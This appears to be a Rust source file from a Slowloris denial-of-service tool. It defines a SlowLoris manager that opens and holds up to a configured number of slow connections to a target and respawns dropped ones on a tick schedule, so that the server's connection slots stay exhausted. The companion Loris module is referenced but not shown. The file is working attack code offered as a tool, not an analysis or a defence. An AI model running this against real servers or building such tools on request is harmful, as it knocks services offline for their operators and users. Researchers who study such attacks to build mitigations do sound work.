use crate::loris::Loris;
use std::{
    net::ToSocketAddrs,
    time::{Duration, Instant},
};

pub struct SlowLoris<A: ToSocketAddrs> {
    target: A,
    interval: Duration,
    loris: Vec<Option<Loris>>,
}

impl<A> SlowLoris<A>
where
    A: ToSocketAddrs,
{
    pub fn new(target: A, interval: Duration, max_connections: usize) -> Self {
        SlowLoris {
            target,
            interval,
            loris: (0..max_connections).map(|_| None).collect(),
        }
    }

    pub fn get_alive(self: &Self) -> usize {
        self.loris.iter().filter(|loris| loris.is_some()).count()
    }

    pub fn get_dead(self: &Self) -> usize {
        self.loris.iter().filter(|loris| loris.is_none()).count()
    }

    pub fn tick(self: &mut Self) -> Instant {
        let tick_time = Instant::now();

        for i in 0..self.loris.len() {
            match &mut self.loris[i] {
                None => self.loris[i] = Loris::spawn(&self.target, self.interval),
                Some(loris) => {
                    // try to tick this Loris, if it fails replace it with None to respawn
                    // during next tick
                    if !loris.tick(tick_time) {
                        self.loris[i] = None;
                    }
                }
            };
        }

        // determine next best time to tick
        self.loris
            .iter()
            .map(|loris| match loris {
                None => tick_time,
                Some(loris) => loris.get_next_tick_time(),
            })
            .min()
            .unwrap_or(tick_time)
    }
}
